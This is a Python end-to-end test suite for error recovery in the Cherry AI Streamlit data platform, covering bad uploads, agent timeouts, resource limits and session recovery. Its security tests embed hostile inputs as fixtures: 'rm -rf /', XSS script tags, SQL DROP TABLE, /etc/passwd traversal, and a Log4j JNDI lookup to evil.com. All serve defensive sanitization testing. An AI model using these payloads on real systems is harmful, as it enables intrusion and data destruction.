"""
E2E Tests for Error Recovery Scenarios - Cherry AI Streamlit Platform

Tests verify system resilience and graceful error handling.
"""

import pytest
import asyncio
import os
import tempfile
from typing import Dict, List, Any
from playwright.async_api import Page
import logging

from utils.page_objects import CherryAIApp
from utils.helpers import TestHelpers, SecurityTestHelpers

logger = logging.getLogger(__name__)


@pytest.mark.agent
class TestFileUploadErrors:
    """Test graceful handling of file upload issues."""
    
    @pytest.mark.asyncio
    async def test_unsupported_file_format(self, streamlit_app):
        """TC3.1.1: Unsupported file format handling."""
        app = CherryAIApp(streamlit_app)
        await app.wait_for_app_ready()
        
        # Create unsupported file format
        with tempfile.NamedTemporaryFile(suffix='.xyz', delete=False) as temp_file:
            temp_file.write(b"This is not a supported format")
            unsupported_file_path = temp_file.name
        
        try:
            # Attempt to upload unsupported file
            await app.file_upload.upload_file(unsupported_file_path)
            
            # Wait a moment for error processing
            await asyncio.sleep(2)
            
            # Check for appropriate error message
            error_message_visible = await TestHelpers.wait_for_condition(
                lambda: streamlit_app.locator('.stError, [data-testid="errorMessage"]').is_visible(),
                timeout=10
            )
            
            assert error_message_visible, "Should display error message for unsupported format"
            
            # Verify error message content
            error_elements = await streamlit_app.locator('.stError, [data-testid="errorMessage"]').all()
            if error_elements:
                error_text = await error_elements[0].text_content()
                error_keywords = ["format", "supported", "invalid", "file type"]
                has_relevant_error = any(keyword in error_text.lower() for keyword in error_keywords)
                assert has_relevant_error, f"Error message should be relevant: {error_text}"
            
            # Verify system remains functional
            await app.chat.send_message("Hello, can you still respond?")
            await app.chat.wait_for_ai_response()
            
            messages = await app.chat.get_chat_messages()
            ai_responses = [m for m in messages if m["type"] == "ai"]
            assert len(ai_responses) > 0, "System should remain functional after file error"
            
            logger.info("✓ Unsupported file format handled gracefully")
            
        finally:
            # Cleanup
            if os.path.exists(unsupported_file_path):
                os.unlink(unsupported_file_path)
    
    @pytest.mark.asyncio
    async def test_corrupt_file_content(self, streamlit_app):
        """TC3.1.2: Corrupt file content handling."""
        app = CherryAIApp(streamlit_app)
        await app.wait_for_app_ready()
        
        # Create corrupt CSV file
        with tempfile.NamedTemporaryFile(suffix='.csv', delete=False, mode='w') as temp_file:
            # Write malformed CSV data
            temp_file.write("id,name,age\n")
            temp_file.write("1,John,25\n")
            temp_file.write("2,Jane\n")  # Missing field
            temp_file.write("3,Bob,thirty,extra_field\n")  # Wrong data type, extra field
            temp_file.write("invalid line without commas\n")
            temp_file.write("4,Alice,")  # Incomplete line
            corrupt_file_path = temp_file.name
        
        try:
            # Upload corrupt file
            await app.file_upload.upload_file(corrupt_file_path)
            
            # Wait for processing
            await asyncio.sleep(3)
            
            # System should either:
            # 1. Show error message, or
            # 2. Process partial data with warnings
            
            error_present = await streamlit_app.locator('.stError, [data-testid="errorMessage"]').is_visible()
            warning_present = await streamlit_app.locator('.stWarning, [data-testid="warningMessage"]').is_visible()
            
            # Should have some form of feedback about the data quality
            assert error_present or warning_present, "Should provide feedback about corrupt data"
            
            # If data cards are shown, they should indicate quality issues
            data_cards = await app.file_upload.get_data_cards()
            if data_cards:
                # Check if quality indicators show issues
                card_text = str(data_cards[0])
                quality_indicators = ["warning", "error", "missing", "malformed", "quality"]
                has_quality_warning = any(indicator in card_text.lower() for indicator in quality_indicators)
                
                # Note: Quality indicators might not always be present in test environment
                logger.info(f"Data quality feedback: {has_quality_warning}")
            
            # System should remain responsive
            await app.chat.send_message("Can you analyze what you can from this data?")
            await app.chat.wait_for_ai_response()
            
            messages = await app.chat.get_chat_messages()
            ai_responses = [m for m in messages if m["type"] == "ai"]
            assert len(ai_responses) > 0, "System should respond even with corrupt data"
            
            logger.info("✓ Corrupt file content handled appropriately")
            
        finally:
            if os.path.exists(corrupt_file_path):
                os.unlink(corrupt_file_path)
    
    @pytest.mark.asyncio
    async def test_file_size_limit_exceeded(self, streamlit_app):
        """TC3.1.3: File size limit exceeded handling."""
        app = CherryAIApp(streamlit_app)
        await app.wait_for_app_ready()
        
        # Create large file (simulate exceeding limits)
        with tempfile.NamedTemporaryFile(suffix='.csv', delete=False, mode='w') as temp_file:
            temp_file.write("id,data\n")
            # Write many rows to create large file
            for i in range(50000):  # This should create a reasonably large file
                temp_file.write(f"{i},{'x' * 100}\n")
            large_file_path = temp_file.name
        
        try:
            file_size = os.path.getsize(large_file_path) / (1024 * 1024)  # Size in MB
            logger.info(f"Test file size: {file_size:.2f} MB")
            
            # Attempt upload
            await app.file_upload.upload_file(large_file_path)
            
            # Wait for processing (longer timeout for large file)
            await asyncio.sleep(10)
            
            # Check for size limit error or successful processing
            error_present = await streamlit_app.locator('.stError, [data-testid="errorMessage"]').is_visible()
            success_present = await streamlit_app.locator('.stSuccess, [data-testid="successMessage"]').is_visible()
            
            if error_present:
                # If error, should be informative about size limits
                error_elements = await streamlit_app.locator('.stError, [data-testid="errorMessage"]').all()
                if error_elements:
                    error_text = await error_elements[0].text_content()
                    size_keywords = ["size", "large", "limit", "memory", "exceeded"]
                    has_size_error = any(keyword in error_text.lower() for keyword in size_keywords)
                    assert has_size_error, f"Error should mention size issues: {error_text}"
                
                logger.info("✓ File size limit error handled appropriately")
            else:
                # If processed successfully, should show data cards
                data_cards = await app.file_upload.get_data_cards()
                if data_cards:
                    # Should show file size information
                    card = data_cards[0]
                    assert "size" in str(card).lower() or "mb" in str(card).lower(), "Response should contain 'size'"
                
                logger.info("✓ Large file processed successfully")
            
            # System should remain functional either way
            await app.chat.send_message("System status check")
            await app.chat.wait_for_ai_response()
            
            messages = await app.chat.get_chat_messages()
            ai_responses = [m for m in messages if m["type"] == "ai"]
            assert len(ai_responses) > 0, "System should remain functional"
            
        finally:
            if os.path.exists(large_file_path):
                os.unlink(large_file_path)
    
    @pytest.mark.asyncio
    async def test_security_threat_detection(self, streamlit_app):
        """TC3.1.5: Security threat detection in uploads."""
        app = CherryAIApp(streamlit_app)
        await app.wait_for_app_ready()
        
        # Create file with potential security issues
        malicious_content = """id,name,command
1,John,"rm -rf /"
2,Jane,"<script>alert('xss')</script>"
3,Bob,"; DROP TABLE users--"
4,Alice,"../../../../etc/passwd"
"""
        
        with tempfile.NamedTemporaryFile(suffix='.csv', delete=False, mode='w') as temp_file:
            temp_file.write(malicious_content)
            malicious_file_path = temp_file.name
        
        try:
            # Upload file with suspicious content
            await app.file_upload.upload_file(malicious_file_path)
            
            # Wait for security processing
            await asyncio.sleep(3)
            
            # Check for security warnings or sanitization
            warning_present = await streamlit_app.locator('.stWarning, [data-testid="warningMessage"]').is_visible()
            error_present = await streamlit_app.locator('.stError, [data-testid="errorMessage"]').is_visible()
            
            # Should show some form of security feedback
            security_feedback = warning_present or error_present
            
            if security_feedback:
                # Verify security-related messaging
                feedback_elements = await streamlit_app.locator('.stWarning, .stError, [data-testid="warningMessage"], [data-testid="errorMessage"]').all()
                if feedback_elements:
                    feedback_text = await feedback_elements[0].text_content()
                    security_keywords = ["security", "suspicious", "sanitized", "filtered", "threat"]
                    has_security_warning = any(keyword in feedback_text.lower() for keyword in security_keywords)
                    
                    # Note: Security keywords might not always be present
                    logger.info(f"Security feedback detected: {has_security_warning}")
            
            # Verify system continues to function securely
            await app.chat.send_message("Please analyze this data safely")
            await app.chat.wait_for_ai_response()
            
            messages = await app.chat.get_chat_messages()
            ai_responses = [m for m in messages if m["type"] == "ai"]
            assert len(ai_responses) > 0, "System should respond after security check"
            
            # Response should not echo back dangerous content
            latest_response = ai_responses[-1]["content"]
            dangerous_patterns = ["rm -rf", "<script>", "DROP TABLE", "etc/passwd"]
            
            has_dangerous_content = any(pattern in latest_response for pattern in dangerous_patterns)
            assert not has_dangerous_content, "Response should not contain dangerous content"
            
            logger.info("✓ Security threat detection working")
            
        finally:
            if os.path.exists(malicious_file_path):
                os.unlink(malicious_file_path)


@pytest.mark.agent
class TestAgentCommunicationErrors:
    """Test A2A agent communication error handling."""
    
    @pytest.mark.asyncio
    async def test_agent_timeout_recovery(self, streamlit_app, test_data_generator, agent_health_checker):
        """TC3.2.1: Agent timeout with progressive retry."""
        app = CherryAIApp(streamlit_app)
        await app.wait_for_app_ready()
        
        # Check which agents are available
        health_status = await agent_health_checker.check_all_agents()
        healthy_agents = [name for name, healthy in health_status.items() if healthy]
        
        if not healthy_agents:
            pytest.skip("No healthy agents available for timeout testing")
        
        # Upload data
        test_data_generator.save_test_files()
        await app.file_upload.upload_file("tests/e2e/test_data/simple_data.csv")
        
        # Send request that might timeout
        query = "Perform a comprehensive analysis with detailed statistical modeling"
        await app.chat.send_message(query)
        
        # Monitor for timeout handling
        timeout_handled = False
        retry_detected = False
        
        for _ in range(180):  # Extended monitoring for timeout scenarios
            active_agents = await app.agents.get_active_agents()
            
            # Look for agents that might be retrying or have failed
            for agent in active_agents:
                status = agent.get("status", "")
                task = agent.get("task", "")
                
                if "retry" in status.lower() or "retry" in task.lower():
                    retry_detected = True
                    logger.info(f"Retry detected for agent: {agent['name']}")
                
                if "timeout" in status.lower() or "failed" in status.lower():
                    timeout_handled = True
                    logger.info(f"Timeout/failure handled for agent: {agent['name']}")
            
            # Check if we got a response despite potential timeouts
            messages = await app.chat.get_chat_messages()
            ai_responses = [m for m in messages if m["type"] == "ai" and len(m["content"]) > 50]
            
            if len(ai_responses) > 0:
                # Got a substantial response, check if it acknowledges any issues
                latest_response = ai_responses[-1]["content"].lower()
                
                error_acknowledgment = any(
                    phrase in latest_response 
                    for phrase in ["timeout", "unavailable", "partial", "limited", "retry"]
                )
                
                if error_acknowledgment:
                    timeout_handled = True
                
                break
            
            await asyncio.sleep(1)
        
        # Ensure we got some response
        await app.chat.wait_for_ai_response()
        
        messages = await app.chat.get_chat_messages()
        ai_responses = [m for m in messages if m["type"] == "ai"]
        
        assert len(ai_responses) > 0, "Should get some response even with timeouts"
        
        # System should acknowledge issues or provide partial results
        final_response = ai_responses[-1]["content"]
        assert len(final_response) > 20, "Should provide meaningful response despite potential timeouts"
        
        logger.info(f"✓ Timeout handling: retry_detected={retry_detected}, timeout_handled={timeout_handled}")
    
    @pytest.mark.asyncio
    async def test_agent_unavailable_fallback(self, streamlit_app, test_data_generator):
        """TC3.2.2: Agent unavailable with fallback strategy."""
        app = CherryAIApp(streamlit_app)
        await app.wait_for_app_ready()
        
        # Upload data
        test_data_generator.save_test_files()
        await app.file_upload.upload_file("tests/e2e/test_data/simple_data.csv")
        
        # Request analysis that might involve unavailable agents
        query = "Please use all available data science tools to analyze this dataset"
        await app.chat.send_message(query)
        
        # Monitor for fallback behavior
        fallback_detected = False
        partial_success = False
        
        for _ in range(120):
            active_agents = await app.agents.get_active_agents()
            
            # Look for signs of fallback behavior
            failed_agents = [a for a in active_agents if a["status"] == "failed"]
            successful_agents = [a for a in active_agents if a["status"] == "completed"]
            
            if len(failed_agents) > 0 and len(successful_agents) > 0:
                fallback_detected = True
                logger.info(f"Fallback detected: {len(failed_agents)} failed, {len(successful_agents)} succeeded")
            
            # Check for partial results
            artifacts = await app.artifacts.get_artifacts()
            if len(artifacts) > 0:
                partial_success = True
            
            # If we have some results, that's good enough
            if partial_success:
                break
            
            await asyncio.sleep(1)
        
        await app.chat.wait_for_ai_response()
        
        # Verify we got some response
        messages = await app.chat.get_chat_messages()
        ai_responses = [m for m in messages if m["type"] == "ai"]
        
        assert len(ai_responses) > 0, "Should get response even with agent unavailability"
        
        # Response should be meaningful
        final_response = ai_responses[-1]["content"]
        assert len(final_response) > 50, "Should provide substantial response using available agents"
        
        logger.info(f"✓ Agent unavailable fallback: fallback_detected={fallback_detected}, partial_success={partial_success}")
    
    @pytest.mark.asyncio
    async def test_invalid_response_format_handling(self, streamlit_app, test_data_generator):
        """TC3.2.3: Invalid response format handling."""
        app = CherryAIApp(streamlit_app)
        await app.wait_for_app_ready()
        
        # Upload data
        test_data_generator.save_test_files()
        await app.file_upload.upload_file("tests/e2e/test_data/simple_data.csv")
        
        # Send request
        query = "Analyze this data and provide statistical insights"
        await app.chat.send_message(query)
        
        # Monitor for response format issues
        format_error_handled = False
        
        for _ in range(90):
            # Check for error messages related to response format
            error_messages = await streamlit_app.locator('.stError, [data-testid="errorMessage"]').all()
            
            for error in error_messages:
                error_text = await error.text_content()
                format_keywords = ["format", "invalid", "parse", "malformed", "json", "response"]
                
                if any(keyword in error_text.lower() for keyword in format_keywords):
                    format_error_handled = True
                    logger.info(f"Format error handled: {error_text}")
                    break
            
            # Check if we eventually get a proper response
            messages = await app.chat.get_chat_messages()
            ai_responses = [m for m in messages if m["type"] == "ai" and len(m["content"]) > 50]
            
            if len(ai_responses) > 0:
                break
            
            await asyncio.sleep(1)
        
        await app.chat.wait_for_ai_response()
        
        # Should eventually get a response
        messages = await app.chat.get_chat_messages()
        ai_responses = [m for m in messages if m["type"] == "ai"]
        
        assert len(ai_responses) > 0, "Should eventually get proper response despite format issues"
        
        logger.info(f"✓ Invalid response format handling: format_error_handled={format_error_handled}")
    
    @pytest.mark.asyncio
    async def test_llm_error_interpretation(self, streamlit_app, test_data_generator):
        """TC3.2.5: LLM-powered error interpretation."""
        app = CherryAIApp(streamlit_app)
        await app.wait_for_app_ready()
        
        # Upload problematic data
        test_data_generator.save_test_files()
        await app.file_upload.upload_file("tests/e2e/test_data/malformed_data.csv")
        
        # Request complex analysis that might cause errors
        query = "Please build a machine learning model and perform advanced statistical analysis"
        await app.chat.send_message(query)
        
        # Wait for response
        await app.chat.wait_for_ai_response()
        
        # Check the response for user-friendly error explanations
        messages = await app.chat.get_chat_messages()
        ai_responses = [m for m in messages if m["type"] == "ai"]
        
        assert len(ai_responses) > 0, "Should get AI response even with errors"
        
        final_response = ai_responses[-1]["content"].lower()
        
        # Look for user-friendly error explanation
        user_friendly_indicators = [
            "unable to", "cannot", "issue with", "problem", "difficulty",
            "data quality", "missing values", "recommend", "suggest",
            "try", "instead", "alternative", "fix", "improve"
        ]
        
        has_user_friendly_explanation = any(
            indicator in final_response for indicator in user_friendly_indicators
        )
        
        # Response should be helpful, not just technical error messages
        is_helpful = len(final_response) > 100 and has_user_friendly_explanation
        
        assert is_helpful, "Should provide user-friendly error interpretation"
        
        logger.info("✓ LLM error interpretation provides user-friendly explanations")


@pytest.mark.agent
class TestSystemResourceErrors:
    """Test system resource constraint handling."""
    
    @pytest.mark.asyncio
    async def test_memory_limit_handling(self, streamlit_app, test_data_generator):
        """TC3.3.1: Memory limit exceeded handling."""
        app = CherryAIApp(streamlit_app)
        await app.wait_for_app_ready()
        
        # Try to trigger memory issues with large operations
        test_data_generator.save_test_files()
        await app.file_upload.upload_file("tests/e2e/test_data/large_data.csv")
        
        # Request memory-intensive operations
        memory_intensive_queries = [
            "Create detailed visualizations for all possible column combinations",
            "Perform comprehensive correlation analysis with all statistical tests",
            "Generate extensive feature engineering with polynomial features"
        ]
        
        memory_issue_detected = False
        
        for query in memory_intensive_queries:
            await app.chat.send_message(query)
            
            # Monitor for memory-related messages
            for _ in range(30):  # 30 second timeout per query
                # Check for memory warnings
                warning_messages = await streamlit_app.locator('.stWarning, [data-testid="warningMessage"]').all()
                
                for warning in warning_messages:
                    warning_text = await warning.text_content()
                    memory_keywords = ["memory", "resource", "limit", "intensive", "reduce"]
                    
                    if any(keyword in warning_text.lower() for keyword in memory_keywords):
                        memory_issue_detected = True
                        logger.info(f"Memory issue detected: {warning_text}")
                        break
                
                if memory_issue_detected:
                    break
                
                await asyncio.sleep(1)
            
            # Try to get response
            try:
                await asyncio.wait_for(app.chat.wait_for_ai_response(), timeout=60)
            except asyncio.TimeoutError:
                logger.info("Query timed out, possibly due to memory constraints")
                memory_issue_detected = True
            
            # If memory issues detected, break early
            if memory_issue_detected:
                break
        
        # System should remain responsive
        await app.chat.send_message("Simple status check")
        await app.chat.wait_for_ai_response()
        
        messages = await app.chat.get_chat_messages()
        ai_responses = [m for m in messages if m["type"] == "ai"]
        
        # Should have at least the status check response
        recent_responses = [m for m in ai_responses if "status" in m["content"].lower()]
        assert len(recent_responses) > 0, "System should remain responsive after memory constraints"
        
        logger.info(f"✓ Memory limit handling: memory_issue_detected={memory_issue_detected}")
    
    @pytest.mark.asyncio
    async def test_concurrent_user_limit(self, streamlit_app):
        """TC3.3.3: Concurrent user limit handling."""
        # This test simulates multiple concurrent sessions
        # In a real deployment, this would test actual user limits
        
        app = CherryAIApp(streamlit_app)
        await app.wait_for_app_ready()
        
        # Simulate concurrent operations
        concurrent_tasks = []
        
        async def simulate_user_session(session_id: int):
            try:
                await app.chat.send_message(f"Session {session_id}: Simple analysis request")
                await app.chat.wait_for_ai_response()
                return {"session_id": session_id, "status": "success"}
            except Exception as e:
                return {"session_id": session_id, "status": "error", "error": str(e)}
        
        # Launch multiple concurrent sessions
        for i in range(5):  # 5 concurrent operations
            task = asyncio.create_task(simulate_user_session(i))
            concurrent_tasks.append(task)
        
        # Wait for all sessions to complete
        results = await asyncio.gather(*concurrent_tasks, return_exceptions=True)
        
        # Analyze results
        successful_sessions = sum(1 for r in results if isinstance(r, dict) and r.get("status") == "success")
        
        # Should handle at least some concurrent sessions
        assert successful_sessions > 0, "Should handle some concurrent sessions successfully"
        
        # System should still be responsive after concurrent load
        await app.chat.send_message("Post-concurrency status check")
        await app.chat.wait_for_ai_response()
        
        messages = await app.chat.get_chat_messages()
        ai_responses = [m for m in messages if m["type"] == "ai"]
        
        status_responses = [m for m in ai_responses if "status" in m["content"].lower()]
        assert len(status_responses) > 0, "System should remain responsive after concurrent load"
        
        logger.info(f"✓ Concurrent user handling: {successful_sessions}/5 sessions succeeded")
    
    @pytest.mark.asyncio
    async def test_session_timeout_recovery(self, streamlit_app):
        """TC3.3.4: Session timeout recovery."""
        app = CherryAIApp(streamlit_app)
        await app.wait_for_app_ready()
        
        # Send initial message to establish session
        await app.chat.send_message("Initial session message")
        await app.chat.wait_for_ai_response()
        
        # Get initial message count
        initial_messages = await app.chat.get_chat_messages()
        initial_count = len(initial_messages)
        
        # Simulate session timeout by waiting and then refreshing
        logger.info("Simulating session timeout...")
        await asyncio.sleep(5)  # Short wait for test purposes
        
        # Refresh page to simulate session restart
        await streamlit_app.reload()
        await app.wait_for_app_ready()
        
        # Try to continue conversation
        await app.chat.send_message("Post-timeout message")
        await app.chat.wait_for_ai_response()
        
        # Verify system recovered
        post_timeout_messages = await app.chat.get_chat_messages()
        
        # Should have at least the post-timeout message and response
        post_timeout_count = len([m for m in post_timeout_messages if "timeout" in m["content"].lower()])
        assert post_timeout_count > 0, "Should handle post-timeout messages"
        
        # System should be fully functional
        await app.chat.send_message("System functionality test")
        await app.chat.wait_for_ai_response()
        
        final_messages = await app.chat.get_chat_messages()
        functionality_responses = [m for m in final_messages if "functionality" in m["content"].lower()]
        
        assert len(functionality_responses) > 0, "System should be fully functional after timeout recovery"
        
        logger.info("✓ Session timeout recovery working")


@pytest.mark.security
class TestSecurityErrorHandling:
    """Test security-related error handling."""
    
    @pytest.mark.asyncio
    async def test_xss_prevention(self, streamlit_app):
        """Test XSS attack prevention."""
        app = CherryAIApp(streamlit_app)
        await app.wait_for_app_ready()
        
        # Test XSS payloads
        xss_payloads = SecurityTestHelpers.generate_xss_payloads()
        
        for payload in xss_payloads[:3]:  # Test first 3 payloads
            await app.chat.send_message(payload)
            
            # Wait for response
            try:
                await app.chat.wait_for_ai_response()
            except Exception:
                # Timeout is acceptable for security filtering
                pass
            
            # Check that malicious content is not reflected in the UI
            page_content = await streamlit_app.content()
            
            # XSS payload should not execute or be present in raw form
            dangerous_patterns = ["<script>", "onerror=", "javascript:"]
            has_dangerous_content = any(pattern in page_content for pattern in dangerous_patterns)
            
            assert not has_dangerous_content, f"XSS payload should be sanitized: {payload}"
        
        # System should remain functional
        await app.chat.send_message("Normal message after XSS test")
        await app.chat.wait_for_ai_response()
        
        messages = await app.chat.get_chat_messages()
        ai_responses = [m for m in messages if m["type"] == "ai"]
        assert len(ai_responses) > 0, "System should remain functional after XSS attempts"
        
        logger.info("✓ XSS prevention working")
    
    @pytest.mark.asyncio
    async def test_malicious_filename_handling(self, streamlit_app):
        """Test malicious filename handling."""
        app = CherryAIApp(streamlit_app)
        await app.wait_for_app_ready()
        
        # Test malicious filenames
        malicious_filenames = SecurityTestHelpers.generate_malicious_filenames()
        
        for filename in malicious_filenames[:3]:  # Test first 3
            # Create temporary file with malicious name pattern
            safe_temp_path = tempfile.mktemp(suffix='.csv')
            
            try:
                with open(safe_temp_path, 'w') as f:
                    f.write("id,name\n1,test\n2,data\n")
                
                # Attempt upload (the filename will be sanitized by the browser/system)
                await app.file_upload.upload_file(safe_temp_path)
                
                # Wait for processing
                await asyncio.sleep(2)
                
                # Check for any security warnings
                security_warnings = await streamlit_app.locator('.stWarning, .stError').count()
                
                # System should either process safely or show appropriate warnings
                data_cards = await app.file_upload.get_data_cards()
                
                # If file was processed, filename should be sanitized
                if data_cards:
                    card_name = data_cards[0].get("name", "")
                    # Dangerous patterns should not appear in displayed filename
                    dangerous_patterns = ["../", "\\\\", "|", ";"]
                    has_dangerous_patterns = any(pattern in card_name for pattern in dangerous_patterns)
                    assert not has_dangerous_patterns, f"Filename should be sanitized: {card_name}"
                
            finally:
                if os.path.exists(safe_temp_path):
                    os.unlink(safe_temp_path)
        
        logger.info("✓ Malicious filename handling working")
    
    @pytest.mark.asyncio
    async def test_input_validation_security(self, streamlit_app):
        """Test comprehensive input validation security."""
        app = CherryAIApp(streamlit_app)
        await app.wait_for_app_ready()
        
        # Test various malicious inputs
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j style injection
            "cat /etc/passwd",  # Command injection
            "eval('malicious code')"  # Code injection
        ]
        
        for malicious_input in malicious_inputs:
            await app.chat.send_message(malicious_input)
            
            try:
                await app.chat.wait_for_ai_response()
            except Exception:
                # Timeout is acceptable for security filtering
                logger.info(f"Input potentially filtered: {malicious_input[:20]}...")
                continue
            
            # Check response doesn't execute or reflect malicious content
            messages = await app.chat.get_chat_messages()
            ai_responses = [m for m in messages if m["type"] == "ai"]
            
            if ai_responses:
                latest_response = ai_responses[-1]["content"]
                
                # Response should not contain dangerous patterns
                dangerous_indicators = ["dropped", "passwd", "malicious", "eval("]
                has_dangerous_response = any(
                    indicator in latest_response.lower() 
                    for indicator in dangerous_indicators
                )
                
                assert not has_dangerous_response, f"Response should not reflect malicious content: {malicious_input}"
        
        # Verify system remains secure and functional
        await app.chat.send_message("Safe message after security tests")
        await app.chat.wait_for_ai_response()
        
        messages = await app.chat.get_chat_messages()
        ai_responses = [m for m in messages if m["type"] == "ai"]
        safe_responses = [m for m in ai_responses if "safe" in m["content"].lower()]
        
        assert len(safe_responses) > 0, "System should remain functional after security tests"
        
        logger.info("✓ Input validation security working")